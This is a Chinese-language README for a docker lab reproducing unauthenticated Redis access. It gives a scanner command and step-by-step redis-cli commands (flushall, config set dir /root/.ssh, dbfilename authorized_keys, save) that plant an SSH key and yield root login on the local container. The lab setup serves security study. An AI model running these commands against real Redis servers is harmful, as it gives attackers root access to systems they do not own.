# Redis 未授权访问

redis 没有用户体系，默认情况下不设置密码，放置在公网的 redis 容易被攻击者利用。

## 环境启动
```bash
docker-compose up
```

文件说明:
* scanner.py: redis 未授权扫描脚本
* id_rsa/id_rsa.pub: 登录用到的 ssh 私钥/公钥

## 未授权检测工具：
```bash
python scanner.py 127.0.0.1 7379
```


## 漏洞复现

连接到 redis(需要提前安装 redis-cli)：
docker 容器里的 redis 6379 端口已映射到 127.0.0.1:6379
```bash
redis-cli -h 127.0.0.1 -p 6379
# 或者使用 nc
nc 127.0.0.1 6379
```

使用 redis 写入 ssh 秘钥：

1. 清空 redis 数据
```
flushall
```

2. 将 redis 持久化文件的目录设置为 /root/.ssh
```
config set dir /root/.ssh/
```

3. 设置持久化文件的文件名
```
config set dbfilename authorized_keys
```

4. 随便添加一个 key-value 对，value 为要写入的秘钥

```
set 1 "\r\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbAVz85xkmAaavA8qSYF4GM55mrGCSmeQl4ZH2un0RSbjhnMUvPHkgOKGIqM2irmjFOCiNOJBafdr75RU2LGM/tRlFnvmsaHdjYdLWNI3nNBDPGXh3M6BmABVU2AEXn2o+rGrzlQyHpkA3YaDHc4gyKXs0MlnOpSM4n7V0YkiVNP9Ykrh/cKHjyc+S5YtI4EAdUFwd75OolcMAgd63Zr0KXYAAeKUmrmeG22D+X5cw4a7PjZucHirk6fb3iJnF+AJPhYqym37NRKsPENZM5U5TXBGeXSJxezSdL76XWLj8C/nIi1SWSi98IuTPJVu72TEWO0cA0f1qOX0yHOGaT9KmhtGLMT9xJroSz2LuYl0SUQU1mgvU5ZGM/yMrh3f3q0YzwKnV9tTqlDlfRH1Vvwf6lI47Fh8ei3zWrt6orUkXZ7j6yWWZX/3OtBwB4Hdb5YILX5LMIhDPMMD+Rq5I72gKgbDzqtsu+P0M4a+y08nKacZ/BprCI1xd5kJ9GM0RKwM= root@ubuntu\r\n"
```
注意秘钥前后添加 \r\n 作为换行符

5. 写入秘钥
```
save
```

6. 登录 docker 容器
容器里 ssh 的 22 端口已映射到 127.0.0.1:6022
```bash
ssh root@127.0.0.1 -p 6022 -i id_rsa
```

如果出现 `Load key "id_rsa.pub": bad permissions`，说明 id_rsa.pub 权限过于开放
设置 id_rsa.pub 为仅自己可读
```bash
chmod 400 id_rsa.pub
```